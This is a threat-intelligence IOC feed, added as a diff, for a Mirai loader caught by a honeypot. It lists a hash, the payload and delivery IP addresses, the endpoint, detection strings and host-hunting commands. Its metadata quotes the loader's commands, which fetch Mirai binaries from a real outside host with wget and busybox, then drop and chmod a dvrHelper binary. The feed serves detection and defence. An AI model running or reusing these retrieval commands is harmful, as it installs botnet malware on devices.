@@ -1,0 +1,62 @@
+# ==============================================================
+# MIRAI_LOADER — IOC Feed
+# Author   : AfterPacket
+# Captured : 2026-08-03T18:19:44Z
+# TLP      : TLP:WHITE
+# Source   : Drosera honeypot / static analysis
+# ==============================================================
+#
+# NOTE: MD5 and SHA-1 are not listed — the analysis host could not
+# execute hashing tools. Only sidecar SHA-256 is available.
+
+# [HASHES — SHA-256]
+246c3c37a0de2987d9352411f22ea4805f7e75287f2782d5ee56770219a096a4   # /wget, 409 B
+
+# [IP ADDRESSES]
+# Confidence: HIGH — SERVER= assignment in the script's config block
+77.90.185.66      # payload host, serves /mirai.<arch>
+# Confidence: HIGH — direct honeypot capture (telnet)
+195.123.171.185   # delivered /wget
+
+# [INFRASTRUCTURE NOTE]
+# 77.90.185.66 (payload host) and 77.90.185.42 (delivered the PERLBOT_SHELLBOT
+# sample /dodu) sit in the same /24. Possible shared hosting or shared operator;
+# recorded as an observation, not an attribution claim.
+
+# [DOMAINS]
+# None. Bare IP staging.
+
+# [PORTS]
+80    # HTTP — payload retrieval from 77.90.185.66
+
+# [HTTP INDICATORS]
+# Endpoint: http://77.90.185.66/mirai.<arch>
+# The literal path component "mirai." is self-identifying and rare in
+# benign traffic — a high-quality, low-noise detection string.
+
+# [CAMPAIGN METADATA]
+# Family      : MIRAI_LOADER (unobfuscated Mirai loader)
+# Config      : SERVER="77.90.185.66"
+# Retrieval   : wget "http://$SERVER/mirai.$arch" -O-
+#               || busybox wget "http://$SERVER/mirai.$arch" -O-
+# Output file : dvrHelper       <- the classic Mirai binary name
+# Also drops  : "$dir"/.f  with chmod 777, executed then cd "$dir"
+# Permissions : chmod +x dvrHelper || chmod 777 dvrHelper
+# VirusTotal  : no VT record at capture time (sidecar scan is null —
+#               absence of data, NOT a clean verdict)
+
+# [RELATED — ACTIVE TARGETING]
+# The BOTKILL_PROCWIPE family (see BOTKILL_PROCWIPE_ioc.txt) contains a
+# script that greps process cmdlines specifically for "dvrHelper" and
+# kills matches. A rival operator is actively hunting THIS family's
+# payload on shared victims.
+
+# [HOST-BASED GREP STRINGS]
+# "77.90.185.66"
+# "mirai."
+# "dvrHelper"
+
+# [HOST HUNT]
+# grep -rl "77.90.185.66\|dvrHelper" /tmp /var/tmp /home /root 2>/dev/null
+# ps aux | grep dvrHelper
+# find / -name "dvrHelper" -o -name ".f" -type f 2>/dev/null
